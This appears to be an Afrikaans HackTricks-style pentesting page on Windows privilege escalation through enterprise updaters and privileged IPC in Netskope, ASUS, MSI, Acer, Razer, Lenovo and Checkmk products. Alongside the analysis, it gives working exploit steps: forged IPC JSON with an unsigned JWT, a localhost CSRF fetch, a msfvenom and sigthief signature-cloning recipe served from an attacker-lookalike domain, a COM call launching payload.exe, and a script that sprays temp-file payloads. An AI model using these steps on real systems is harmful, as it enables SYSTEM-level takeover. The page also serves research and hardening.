# Misbruik van Enterprise Auto-Updaters en Privileged IPC (bv. Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Hierdie bladsy veralgemeen ’n klas Windows-plaaslike privilege-escalation-kettings wat gevind is in enterprise-endpoint-agente en updaters wat ’n maklik toeganklike IPC-oppervlak en ’n geprivilegieerde update-vloei blootstel. ’n Verteenwoordigende voorbeeld is Netskope Client for Windows < R129 (CVE-2025-0309), waar ’n gebruiker met lae privilegies enrollment na ’n aanvaller-beheerde bediener kan dwing en dan ’n kwaadwillige MSI kan aflewer wat die SYSTEM-diens installeer.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Sleutelidees wat jy teen soortgelyke produkte kan hergebruik:
- Misbruik ’n geprivilegieerde diens se localhost IPC om her-enrollment of herkonfigurasie na ’n aanvallerbediener af te dwing.
- Implementeer die verskaffer se update-endpoints, lewer ’n kwaadwillige Trusted Root CA af en wys die updater na ’n kwaadwillige, “ondertekende” pakket.
- Omseil swak signer-kontroles (CN-toelaatlyste), opsionele digest-vlae en permissiewe MSI-eienskappe.
- As IPC “geënkripteer” is, lei die sleutel/IV af van masjienidentifiseerders wat wêreldwyd leesbaar in die registry gestoor word.
- As die diens bellers beperk op grond van image path/prosesnaam, injecteer in ’n proses op die toelaatlys of begin een suspended en bootstrap jou DLL via ’n minimale thread-context-patch.

Pasgemaakte plaaslike TCP-dienste verdien dieselfde ondersoek van identiteit en invoergrense, selfs wanneer hulle ’n PIN of ander toepassingscredential vereis. Koppel die listener aan sy proses en effektiewe diensrekening, en ondersoek dan die presiese ontplooide binary/weergawe en of velde wat deur die beller beheer word, lengtegekontroleer word voordat dit na vaste buffers gekopieer word of gebruik word om ’n child-process-opdrag saam te stel. [Microsoft se leiding oor buffer-oorskrydings](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) verduidelik waarom ongekontroleerde eksterne invoer gevaarlik is in geprivilegieerde native kode. ’n Loopback-listener, hardcoded credential of prosesnaam alleen bewys nie geheuekorrupsie of SYSTEM-uitvoering nie; bereikbaarheid, magtiging, kodepad en versagtingsmaatreëls bly afsonderlike voorwaardes. Hou roetine-enumerasie passief eerder as om invoer met ’n lengte wat ’n crash kan veroorsaak na ’n lewendige diens te stuur.

---
## 1) Dwing enrollment na ’n aanvallerbediener via localhost IPC

Baie agente sluit ’n user-mode UI-proses in wat via localhost TCP met ’n SYSTEM-diens kommunikeer deur JSON te gebruik.

Waargeneem in Netskope:
- UI: stAgentUI (low integrity) ↔ Diens: stAgentSvc (SYSTEM)
- IPC-opdrag-ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit-vloei:
1) Stel ’n JWT-enrollment-token saam waarvan die claims die backend-host beheer (bv. AddonUrl). Gebruik alg=None sodat geen handtekening nodig is nie.
2) Stuur die IPC-boodskap wat die provisioning-opdrag met jou JWT en tenant-naam aanroep:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Die diens begin versoeke vir registrasie/konfigurasie na jou rogue server stuur, bv.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notas:
- As bellerverifikasie op die pad/naam gebaseer is, stuur die versoek vanaf 'n goedgekeurde verskaffer-binêre lêer (sien §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Kaping van die update-kanaal om code as SYSTEM uit te voer

Sodra die kliënt met jou server kommunikeer, implementeer die verwagte endpoints en stuur dit na 'n aanvaller se MSI. Tipiese volgorde:

1) /v2/config/org/clientconfig → Gee JSON-konfigurasie terug met 'n baie kort updater-interval, bv.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Gee ’n PEM CA-sertifikaat terug. Die diens installeer dit in die Local Machine Trusted Root store.
3) /v2/checkupdate → Voorsien metadata wat na ’n kwaadwillige MSI en ’n vals weergawe wys.

Omseiling van algemene kontroles wat in die praktyk voorkom:
- Signer CN allow-list: die diens kontroleer dalk net of die Subject CN gelyk is aan “netSkope Inc” of “Netskope, Inc.”. Jou rogue CA kan ’n leaf met daardie CN uitreik en die MSI onderteken.
- CERT_DIGEST-eienskap: sluit ’n onskadelike MSI-eienskap genaamd CERT_DIGEST in. Geen afdwinging tydens installasie nie.
- Opsionele digest-afdwinging: ’n config-vlag (bv. check_msi_digest=false) deaktiveer bykomende kriptografiese validering.

Resultaat: die SYSTEM-diens installeer jou MSI vanaf
C:\ProgramData\Netskope\stAgent\data\*.msi
en voer arbitrêre kode as NT AUTHORITY\SYSTEM uit.<sup>[[1]](#references)[[2]](#references)</sup>

Les oor die omseiling van patches: as ’n verkoper reageer deur ’n klein stel “trusted” domeine op ’n allow-list te plaas in plaas daarvan om die opdateringsbron kriptografies te verifieer, soek na verkoperbeheerde redirectors of reverse proxies wat jou steeds toelaat om verkeer te stuur. In Netskope se geval het openbare opvolgnavorsing getoon dat ’n allow-list uit die R129-era steeds deur `rproxy.goskope.com` misbruik kon word, wat inhoud van ’n Azure App Service onder aanvallersbeheer geproxy het. Beskou hostname-allow-lists as ’n hindernis, nie as ’n vertrouensgrens nie.<sup>[[14]](#references)</sup>

---
## 3) Vervalsing van geënkripteerde IPC-versoeke (waar dit voorkom)

Vanaf R127 het Netskope IPC JSON in ’n encryptData-veld verpak wat soos Base64 lyk. Omgekeerde ontleding het AES aan die lig gebring, met ’n sleutel/IV wat afgelei is van registry-waardes wat vir enige gebruiker leesbaar is:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Aanvallers kan die enkripsie reproduseer en geldige geënkripteerde opdragte vanaf ’n standaardgebruiker stuur.<sup>[[1]](#references)[[2]](#references)</sup> Algemene wenk: as ’n agent skielik sy IPC “encrypt”, soek onder HKLM na toestel-ID’s, produk-GUID’s en installasie-ID’s wat as materiaal gebruik word.

---
## 4) Omseiling van IPC-beller-allow-lists (pad-/naamkontroles)

Sommige dienste probeer die eweknie verifieer deur die PID van die TCP-verbinding op te spoor en die beeldpad/-naam te vergelyk met vendor-binaries op ’n allow-list, wat onder Program Files geleë is (bv. stagentui.exe, bwansvc.exe, epdlp.exe).

Twee praktiese omseilings:
- DLL-inspuiting in ’n proses op die allow-list (bv. nsdiag.exe) en proxy IPC vanuit die proses.
- Begin ’n binary op die allow-list in opgeskorte toestand en laai jou proxy-DLL sonder CreateRemoteThread (sien §5) om te voldoen aan driver-afgedwonge peuterbeskermingsreëls.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Inspuiting wat peuterbeskerming in ag neem: opgeskorte proses + NtContinue-patch

Produkte sluit dikwels ’n minifilter-/OB-callbacks-driver (bv. Stadrv) in om gevaarlike regte te verwyder van handvatsels na beskermde prosesse:
- Proses: verwyder PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: beperk tot THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

’n Betroubare user-mode loader wat hierdie beperkings respekteer:
1) Skep ’n proses van ’n vendor-binary met CREATE_SUSPENDED.
2) Kry die handvatsels wat steeds toegelaat word: PROCESS_VM_WRITE | PROCESS_VM_OPERATION op die proses, en ’n thread-handvatsel met THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (of net THREAD_RESUME as jy kode op ’n bekende RIP patch).
3) Oorskryf ntdll!NtContinue (of ’n ander vroeë, gewaarborgde-gelaaide thunk) met ’n klein stub wat LoadLibraryW op jou DLL-pad aanroep en dan terugspring.
4) ResumeThread om jou stub in die proses te aktiveer en jou DLL te laai.

Omdat jy nooit PROCESS_CREATE_THREAD of PROCESS_SUSPEND_RESUME op ’n reeds beskermde proses gebruik het nie (jy het dit geskep), voldoen jy aan die driver se beleid.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Praktiese hulpmiddels
- NachoVPN (Netskope-inprop) outomatiseer ’n rogue CA, die ondertekening van kwaadwillige MSI’s en die bediening van die nodige eindpunte: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope is ’n pasgemaakte IPC-kliënt wat arbitrêre (opsioneel AES-geënkripteerde) IPC-boodskappe saamstel en die inspuiting van opgeskorte prosesse insluit om boodskappe vanaf ’n binary op die allow-list te stuur.<sup>[[4]](#references)</sup>

## 7) Vinnige triage-werkvloei vir onbekende updater-/IPC-oppervlakke

Wanneer jy ’n nuwe endpoint-agent of moederbord-“helper”-pakket ondersoek, is ’n vinnige werkvloei gewoonlik genoeg om vas te stel of dit ’n belowende privesc-teiken is:<sup>[[6]](#references)</sup>

1) Lys loopback-listeners op en koppel hulle aan die vendor-prosesse:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Lys moontlike benoemde pype:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Ontgin registry-gesteunde roeteringsdata wat deur plugin-gebaseerde IPC-bedieners gebruik word:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Onttrek endpoint name, JSON keys en command-ID's eers uit die user-mode client. Gepakte Electron/.NET-frontends leak dikwels die volledige skema:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Soek na die werklike vertrouensvoorwaarde, nie net die kodepad wat uiteindelik die proses begin nie:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Patrone wat voorkeur verdien:
- `CryptQueryObject`/sertifikaatontleding sonder `WinVerifyTrust` beteken gewoonlik dat “sertifikaat bestaan” as “sertifikaat is vertrou” beskou is, wat sertifikaatkloon of ander vals-ondertekenaar-truuks moontlik maak.
- Substring-/agtervoegselkontroles op `Origin`, `Referer`, aflaai-URL’s, prosesname of ondertekenaar-CN’s is nie verifikasie nie. `contains(".vendor.com")` is gewoonlik uitbuitbaar met aanvallerbeheerde domeine wat soos die regte domein lyk.
- As die GUI met lae voorregte besluit “die lêer is vertrou” en die SYSTEM-broker bloot daardie resultaat gebruik, omseil die grens dikwels heeltemal deur die DLL/JS aan die kliëntkant te patch of te herimplementeer (Razer-styl-verdeelde validering).
- As die broker ’n loonvrag na `%TEMP%`/`C:\Windows\Temp` kopieer en dit dan vanaf daardie pad valideer of skeduleer, toets onmiddellik vir TOCTOU-vervangingsvensters en vir sibling-inpropmodules wat alternatiewe `ExecuteTask()`-wrappers met swakker kontroles blootstel.<sup>[[6]](#references)</sup>

Vir teikens met baie named pipes is PipeViewer ’n vinnige manier om swak DACL’s en op afstand bereikbare pipes raak te sien voordat jy die protokol in diepte begin reverse-engineer.<sup>[[11]](#references)</sup>

As die teiken oproepers slegs volgens PID, beeldpad of prosesnaam verifieer, beskou dit as ’n spoedhobbel eerder as ’n grens: om in die wettige kliënt in te spuit, of die verbinding vanuit ’n toegelate proses te maak, is dikwels genoeg om aan die bediener se kontroles te voldoen. Vir named pipes spesifiek, behandel [hierdie bladsy oor kliënt-impersonering en pipe-misbruik](named-pipe-client-impersonation.md) die primitive in meer diepte.

Vir ’n bevoorregte **opruim- of herstelbroker**, ondersoek die padvertrouensgrens sowel as die pipe-ACL. ’n Oproeper met laer voorregte kan dalk ’n herstelbestemming kies of ’n opgevoerde rugsteunartefak in ’n gedeelde gids hernoem, selfs wanneer die diensuitvoerbare lêer en sy installasiegids beskerm is. Bevestig afsonderlik dat die oproeper die herstelopdrag kan bereik, die presiese opgevoerde invoerlêer of lêernaam kan wysig, die broker onder ’n hoër identiteit loop en die herstelbewerking werklik na die gekose beskermde pad skryf. ’n Skryfbare opvoer-gids of ’n leesbare pipe bewys op sigself nie ’n arbitrêre bevoorregte skryfbewerking nie; die bestemmingkartering en diensgedrag moet deur kodehersiening of beheerde toetsing bevestig word. Moenie ’n onbekende opruimopdrag tydens passiewe verkenning uitvoer nie, want dit kan gebruikerslêers uitvee.

---
## 8) Modulêre add-in-brokers wat slegs deur verskafferhandtekeninge geverifieer word (Lenovo Vantage-patroon)

’n Nuwer variasie wat die moeite werd is om na te soek, is die **RPC-broker met ondertekende kliënt**: ’n Lenovo-ondertekende rekenaarproses met lae voorregte kommunikeer met ’n SYSTEM-diens, en die diens stuur JSON-opdragte aan ’n stel XML-beskrewe add-ins onder `%ProgramData%`. Sodra kode-uitvoering **binne enige aanvaarde ondertekende kliënt** verkry is, word elke `runas="system"`-kontrak deel van jou aanvalsvlak.<sup>[[15]](#references)</sup>

Primitiewe met hoë waarde wat in Lenovo Vantage-navorsing waargeneem is:
- **Vertroue in die oproeper omdat dit deur die verskaffer onderteken is**: navorsers het ’n geverifieerde konteks bereik deur ’n Lenovo-ondertekende EXE na ’n skryfbare gids te kopieer en ’n DLL-side-load (`profapi.dll`) te bewerkstellig sodat arbitrêre kode uitgevoer is binne ’n kliënt wat die diens reeds vertrou het.
- **Ontdekking van aanvalsvlakke deur manifestgedrewe ondersoek**: add-ins word onder `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` verklaar; verskeie kontrakte loop as `SYSTEM`, dus onthul die opsomming van daardie manifeste dikwels die werklik bevoorregte werkwoorde vinniger as om die broker self te reverse-engineer.
- **Foute per opdrag agter die geverifieerde kanaal**: openbare navorsing het, nadat hulle binne die vertroude kliënt gekom het, padtraversering plus rastoestande in opdaterings-/installasie-opdragte, misbruik van rou SQL in bevoorregte instellingdatabasisse en substringgebaseerde registerpadkontroles gevind wat skryfbewerkings buite die bedoelde hive moontlik gemaak het.

Nuttige verkenning op ’n teiken:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Praktiese gevolgtrekking: wanneer ’n helper-suite ’n broker blootstel wat eers die **caller process** verifieer en daarna eers dosyne plugin/add-in-opdragte uitvoer, moenie ophou nadat jy die vertrouenskontrole by die voordeur omseil het nie. Dump die manifest/contract-tabel en fuzz elke hoëvoorregwerkwoord afsonderlik; die geverifieerde kanaal verberg gewoonlik verskeie tweedevlak-foute.

---
## 1) Browser-na-localhost-CSRF teen bevoorregte HTTP-API’s (ASUS DriverHub)

DriverHub lewer ’n HTTP-diens in gebruikersmodus (ADU.exe) op 127.0.0.1:53000 wat verwag dat browser-oproepe van https://driverhub.asus.com af kom. Die oorspronkontrole doen bloot `string_contains(".asus.com")` op die Origin-header en op aflaai-URL’s wat deur `/asus/v1.0/*` blootgestel word. Enige aanvallerbeheerde gasheer soos `https://driverhub.asus.com.attacker.tld` slaag dus die kontrole en kan JavaScript gebruik om versoeke te stuur wat die stelseltoestand verander.<sup>[[6]](#references)</sup> Sien [CSRF-basics](../../pentesting-web/csrf-cross-site-request-forgery.md) vir bykomende omseilpatrone.

Praktiese vloei:
1) Registreer ’n domein wat `.asus.com` insluit en huisves ’n kwaadwillige webblad daarop.
2) Gebruik `fetch` of XHR om ’n bevoorregte eindpunt (bv. `Reboot`, `UpdateApp`) op `http://127.0.0.1:53000` aan te roep.
3) Stuur die JSON-liggaam wat deur die handler verwag word – die verpakde frontend-JS wys die skema hieronder.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Selfs die PowerShell CLI wat hieronder gewys word, slaag wanneer die Origin-kopskrif vervals word om die vertroude waarde te wees:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Enige besoek met ’n blaaier aan die aanvaller se webwerf word dus ’n plaaslike CSRF met een klik (of geen klik via `onload`) wat ’n helper met SYSTEM-regte aanstuur.

---
## 2) Onveilige verifikasie van kode-ondertekening en kloon van sertifikaat (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` laai arbitrêre uitvoerbare lêers af wat in die JSON-liggaam gedefinieer is, en kas hulle in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. URL-validering vir aflaaie gebruik dieselfde substring-logika, daarom word `http://updates.asus.com.attacker.tld:8000/payload.exe` aanvaar. Ná die aflaai kyk ADU.exe bloot of die PE ’n handtekening bevat en of die Subject-string met ASUS ooreenstem voordat dit die lêer uitvoer – geen `WinVerifyTrust` of kettingvalidering nie.

Om hierdie vloei te bewapen:
1) Skep ’n payload (bv. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Kloon ASUS se ondertekenaar daarin (bv. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Bedien `pwn.exe` op ’n domein wat soos `.asus.com` lyk en aktiveer UpdateApp via die bogenoemde CSRF in die blaaier.

Omdat beide die Origin- en URL-filters op substringe berus en die ondertekenaarstoets slegs stringe vergelyk, laai DriverHub die aanvaller se binêre lêer af en voer dit binne sy verhoogde konteks uit.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU binne kopieer-/uitvoer-paaie van die updater (MSI Center CMD_AutoUpdateSDK)

MSI Center se SYSTEM-diens stel ’n TCP-protokol bloot waarin elke raam `4-byte ComponentID || 8-byte CommandID || ASCII arguments` is. Die kernkomponent (Component ID `0f 27 00 00`) bevat `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Sy hanteerder:
1) Kopieer die verskafde uitvoerbare lêer na `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifieer die handtekening via `CS_CommonAPI.EX_CA::Verify` (die sertifikaat se Subject moet gelyk wees aan “MICRO-STAR INTERNATIONAL CO., LTD.” en `WinVerifyTrust` moet slaag).
3) Skep ’n geskeduleerde taak wat die tydelike lêer as SYSTEM uitvoer met argumente wat deur die aanvaller beheer word.

Die gekopieerde lêer word nie tussen verifikasie en `ExecuteTask()` gesluit nie. ’n Aanvaller kan:
- Raam A stuur wat na ’n wettige MSI-ondertekende binêre lêer wys (dit verseker dat die handtekeningstoets slaag en die taak in die tou geplaas word).
- Dit met herhaalde Raam B-boodskappe laat jaag wat na ’n kwaadwillige payload wys, om `MSI Center SDK.exe` te oorskryf net nadat verifikasie voltooi is.

Wanneer die skeduleerder die taak uitvoer, voer dit die oorskryfde payload as SYSTEM uit, al is die oorspronklike lêer gevalideer. Betroubare uitbuiting gebruik twee goroutines/threads wat `CMD_AutoUpdateSDK` aanhoudend oorstroom totdat die TOCTOU-venster gewen word.<sup>[[6]](#references)</sup>

---
## 2) Misbruik van pasgemaakte IPC op SYSTEM-vlak en impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP-opdragstelle
- Elke plugin/DLL wat deur `MSI.CentralServer.exe` gelaai word, kry ’n Component ID wat onder `HKLM\SOFTWARE\MSI\MSI_CentralServer` gestoor word. Die eerste 4 grepe van ’n raam kies daardie komponent, sodat aanvallers opdragte na arbitrêre modules kan stuur.
- Plugins kan hul eie taakuitvoerders definieer. `Support\API_Support.dll` stel `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` bloot en roep `API_Support.EX_Task::ExecuteTask()` direk aan, **sonder enige handtekeningvalidering** – enige plaaslike gebruiker kan dit na `C:\Users\<user>\Desktop\payload.exe` laat wys en sodoende betroubaar SYSTEM-uitvoering verkry.
- Deur loopback met Wireshark te snuffel of die .NET-binêre lêers in dnSpy te instrumenteer, kan die kartering van komponent na opdrag vinnig ontdek word; pasgemaakte Go-/Python-kliënte kan dan rame herhaal.<sup>[[6]](#references)</sup>

### Acer Control Centre-benoemde pype en impersonation-vlakke
- `ACCSvc.exe` (SYSTEM) stel `\\.\pipe\treadstone_service_LightMode` bloot, en die diskresionêre ACL laat afgeleë kliënte toe (bv. `\\TARGET\pipe\treadstone_service_LightMode`). Deur opdrag-ID `7` met ’n lêerpad te stuur, word die diens se prosesbeginroetine aangeroep.
- Die kliëntbiblioteek serialiseer ’n magiese terminatorgreep (113) saam met args. Dinamiese instrumentering met Frida/`TsDotNetLib` (sien [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) vir instrumenteringswenke) wys dat die inheemse hanteerder hierdie waarde na ’n `SECURITY_IMPERSONATION_LEVEL` en integriteit-SID karteer voordat `CreateProcessAsUser` aangeroep word.
- Deur 113 (`0x71`) met 114 (`0x72`) te vervang, beland die uitvoering in die generiese vertakking wat die volledige SYSTEM-token behou en ’n hoë-integriteit-SID (`S-1-16-12288`) stel. Die beginproses loop dus as onbeperkte SYSTEM, plaaslik sowel as oor masjiene heen.
- Kombineer dit met die blootgestelde installeerdervlag (`Setup.exe -nocheck`) om ACC selfs op laboratorium-VM’s te installeer en die pyp sonder verskafferhardeware te toets.<sup>[[6]](#references)</sup>

Hierdie IPC-foute wys waarom localhost-dienste wedersydse verifikasie moet afdwing (ALPC-SID’s, `ImpersonationLevel=Impersonation`-filters, tokenfiltrering), en waarom elke module se helper vir “arbitrêre binêre lêer uitvoer” dieselfde verifikasies van ondertekenaars moet gebruik.

---
## 3) COM/IPC-“elevator”-helpers wat op swak gebruikersmodus-validering staatmaak (Razer Synapse 4)

Razer Synapse 4 het nog ’n nuttige patroon by hierdie familie gevoeg: ’n gebruiker met lae regte kan ’n COM-helper vra om ’n proses via `RzUtility.Elevator` te begin, terwyl die vertrouensbesluit aan ’n gebruikersmodus-DLL (`simple_service.dll`) oorgelaat word eerder as om dit sterk binne die bevoorregte grens af te dwing.

Waargenome uitbuitingspad:
- Skep ’n instansie van die COM-objek `RzUtility.Elevator`.
- Roep `LaunchProcessNoWait(<path>, "", 1)` aan om ’n verhoogde begin aan te vra.
- In die openbare PoC word die PE-handtekeninghek binne `simple_service.dll` gelap voordat die versoek gestuur word, sodat ’n arbitrêre uitvoerbare lêer wat deur die aanvaller gekies is, begin kan word.<sup>[[6]](#references)[[10]](#references)</sup>

Minimale PowerShell-aanroep:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Algemene gevolgtrekking: wanneer jy “helper”-suites reverse-engineer, moenie by localhost TCP of named pipes stop nie. Kyk vir COM-klasse met name soos `Elevator`, `Launcher`, `Updater` of `Utility`, en verifieer dan of die bevoorregte diens self die teikenbinêre lêer valideer, of bloot ’n resultaat vertrou wat deur ’n aanpasbare user-mode client DLL bereken is. Hierdie patroon strek verder as Razer: enige gesplete ontwerp waar die hoëbevoorregte broker ’n toelaat-/weierbesluit van die laebevoorregte kant aanvaar, is ’n moontlike privesc-oppervlak.


---
## Voorspelbare tydelike skripuitvoering tydens MSI-herstel (Checkmk Agent / CVE-2024-0670)

Sommige Windows-agente voer steeds bevoorregte aksies uit deur ’n tydelike `.cmd`-lêer in `C:\Windows\Temp` te skryf en dit as `SYSTEM` uit te voer. As die lêernaam voorspelbaar is en die diens nie bestaande lêers veilig herskep nie, kan ’n gebruiker met lae voorregte die toekomstige tydelike lêer vooraf as **leesalleen** skep en die bevoorregte proses dwing om aanvallerbeheerde inhoud uit te voer in plaas van sy eie skrip.

Waargeneem in kwesbare Checkmk Agent-bouweergawes:
- tydelike lêerpatroon: `cmk_all_<PID>_1.cmd`
- geaffekteerde takke: `2.0.0`, `2.1.0`, `2.2.0`
- sneller: MSI-**herstel** van die kasgeheue-agentpakket<sup>[[8]](#references)[[9]](#references)</sup>

Praktiese werksvloei:
1. Skat ’n realistiese PID-reeks op grond van huidige proses-ID’s of die lopende agent-PID.
2. Skryf ’n kort **ASCII** `.cmd`-lading (`Set-Content -Encoding Ascii` of `cmd.exe`-herleiding; vermy UTF-16 PowerShell-uitvoer vir bondellêers).
3. Spuit `C:\Windows\Temp\cmk_all_<PID>_1.cmd` oor die kandidaat-reeks uit en merk elke lêer as leesalleen.
4. Sneller ’n herstel van die MSI in die kasgeheue, sodat die bevoorregte diens probeer om die tydelike skrip te herskep en dit dan uit te voer.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

As die kwesbare produk met Windows Installer geïnstalleer is, koppel die ewekansig lykende kas-MSI onder `C:\Windows\Installer` aan sy produknaam voordat jy die herstel aktiveer:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Bedryfsnotas:
- `qwinsta` is nuttig wanneer `msiexec /fa` vanaf ’n nie-interaktiewe WinRM-shell misluk en jy moet vasstel of ’n bestaande werkskerm-/ontkoppelde sessie die herstelproses korrek kan aktiveer.<sup>[[7]](#references)</sup>
- Hierdie patroon geld ook vir ander endpoint-agente en updaters wat **tydelike scripts in skryfbare liggings vir almal plaas en dit later as SYSTEM uitvoer**. Toets vir voorspelbare name, ontbrekende eksklusiewe skeppingssemantiek en herstel-/opdateringsvloeie wat op aanvraag geaktiveer kan word.

### Interaktiewe installerherstel en bevoorregte konsole

PDF24 Creator 11.15.1 illustreer ’n afsonderlike MSI-herstelrisiko: die printer-install custom action kan tydens herstel ’n sigbare konsole met SYSTEM-regte begin. Die verskaffer het die MSI-installeerder in 11.15.2 verander om hierdie gedrag aan te spreek. ’n Ouer produkweergawe is slegs ’n leidraad vir triage. Kontroleer die geregistreerde of bereikbare MSI-pakket, of hierdie gebruiker herstel kan begin, of die kwesbare custom action en vertraging in die loglêer teenwoordig is, en of ’n interaktiewe werkskerm die konsole sigbaar kan maak. Die gerapporteerde vertraging het ’n oplock op `faxPrnInst.log` gebruik; gewone skryfbaarheid van die lêer is nie die enigste toegangvoorwaarde nie. ’n Nie-interaktiewe shell, ontoeganklike pakket of reggestelde installeerder kan die ketting verbreek. Hierdie probleem is nie afhanklik van `AlwaysInstallElevated` nie en verskil van die vervanging van ’n voorspelbare tydelike script.

---
## Afgeleë voorsieningsketting-kaping via swak updater-validering (WinGUp / Notepad++)

Tussen Junie 2025 en Desember 2025 het aanvallers wat die gasheerinfrastruktuur agter die Notepad++-opdateringsvloei gekompromitteer het, selektief kwaadwillige manifeste aan uitgesoekte slagoffers bedien. Ouer WinGUp-gebaseerde updaters het nie die egtheid van opdaterings ten volle geverifieer nie, dus kon ’n kwaadwillige XML-respons kliënte na aanvallerbeheerde URL’s herlei. Omdat die kliënt HTTPS-inhoud aanvaar het sonder om sowel ’n vertroude sertifikaatketting as ’n geldige PE-handtekening op die afgelaaide installeerder af te dwing, het slagoffers ’n getrojaniseerde NSIS-`update.exe` afgelaai en uitgevoer.<sup>[[12]](#references)[[13]](#references)</sup>

Operasionele vloei (geen plaaslike exploit nodig nie):
1. **Infrastruktuuronderskepping**: kompromitteer CDN/gasheerinfrastruktuur en beantwoord opdateringskontroles met aanvaller-metadata wat na ’n kwaadwillige aflaai-URL verwys.
2. **Getrojaniseerde NSIS**: die installeerder haal ’n payload op en voer dit uit, en misbruik twee uitvoeringskettings:
   - **Bring-your-own signed binary + sideload**: bundel die getekende Bitdefender-`BluetoothService.exe` en plaas ’n kwaadwillige `log.dll` in sy soekpad. Wanneer die getekende binary loop, sideload Windows `log.dll`, wat die Chrysalis-backdoor dekripteer en reflektief laai (Warbird-beskerm + API-hashing om statiese opsporing te bemoeilik).
   - **Scripted shellcode-injection**: NSIS voer ’n saamgestelde Lua-script uit wat Win32-API’s (bv. `EnumWindowStationsW`) gebruik om shellcode in te spuit en Cobalt Strike Beacon te plaas.<sup>[[12]](#references)</sup>

Verhardings-/opsporingslesse vir enige auto-updater:
- Dwing **sertifikaat- en handtekeningverifikasie** van die afgelaaide installeerder af (pen die verskaffer se ondertekenaar vas, verwerp verkeerde CN/ketting) en onderteken die opdateringsmanifest self (bv. XMLDSig). Blokkeer manifestbeheerde herleidings tensy dit gevalideer is.
